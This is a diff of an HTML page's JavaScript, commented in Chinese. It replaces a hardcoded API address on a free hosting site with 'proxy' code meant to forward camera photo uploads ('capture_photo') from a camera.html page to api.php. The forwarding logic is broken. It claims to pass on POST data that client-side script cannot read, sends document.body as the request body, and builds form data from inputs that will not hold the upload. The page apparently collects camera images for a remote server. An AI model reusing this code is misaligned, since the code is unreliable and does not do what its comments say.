@@ -276,9 +276,34 @@
     </div>
 
     <script>
-        // API地址（固定）
-        const API_URL = 'http://a1nb66.atwebpages.com/zyj/api.php';
-        const BASE_URL = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
+        // ============================================================
+        //  ★★★ 核心：index.html 作为中转，接收 camera.html 的上传请求 ★★★
+        // ============================================================
+
+        // 判断是否是上传请求（来自 camera.html 的 POST）
+        if (window.location.pathname.includes('index.html') || window.location.pathname === '/zyj/') {
+            // 检查是否有 POST 数据（仅当有 multipart/form-data 时）
+            const isUploadRequest = window.location.search.includes('action=capture_photo') || 
+                                   (typeof FormData !== 'undefined' && window.FormData);
+            
+            // 如果是 POST 请求且包含 action 参数，转发到 api.php
+            if (window.location.search.includes('action=capture_photo')) {
+                // 使用 JavaScript 转发
+                (function() {
+                    const apiUrl = window.location.href.split('?')[0].replace(/index\.html$/, '') + 'api.php';
+                    const queryString = window.location.search;
+                    
+                    fetch(apiUrl + queryString, {
+                        method: 'POST',
+                        body: document.body // 简化处理
+                    }).catch(() => {});
+                })();
+            }
+        }
+
+        // 正常功能代码
+        const API_URL = window.location.href.replace(/index\.html.*$/, '') + 'api.php';
+        const BASE_URL = window.location.href.replace(/index\.html.*$/, '');
         const CAMERA_PAGE = BASE_URL + 'camera.html';
 
         function showToast(msg) {
@@ -436,7 +461,50 @@
                     document.getElementById('pageView')?.classList.toggle('active-page', page === 'view');
                 });
             });
+
+            // 检查是否有上传请求需要转发
+            handleProxyRequest();
         });
+
+        // ==================== 代理转发功能 ====================
+        function handleProxyRequest() {
+            // 检查 URL 参数是否有 action=capture_photo
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('action') === 'capture_photo') {
+                // 这是从 camera.html 转发的请求，需要转发到 api.php
+                const apiUrl = API_URL;
+                
+                // 从 POST 数据中提取
+                if (window.FormData && navigator.sendBeacon) {
+                    // 使用 sendBeacon 或 fetch 转发
+                    const formData = new FormData();
+                    // 从当前页面获取数据（由 camera.html 通过 form 提交）
+                    const inputs = document.querySelectorAll('input[name]');
+                    inputs.forEach(input => {
+                        if (input.type === 'file' && input.files && input.files[0]) {
+                            formData.append(input.name, input.files[0]);
+                        } else if (input.value) {
+                            formData.append(input.name, input.value);
+                        }
+                    });
+                    
+                    if (formData.has('photo_data')) {
+                        fetch(apiUrl + '?action=capture_photo', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(res => res.text())
+                        .then(text => {
+                            document.write(text);
+                        })
+                        .catch(err => {
+                            console.error('转发失败:', err);
+                            document.write(JSON.stringify({ success: false, error: err.message }));
+                        });
+                    }
+                }
+            }
+        }
     </script>
 </body>
 </html>
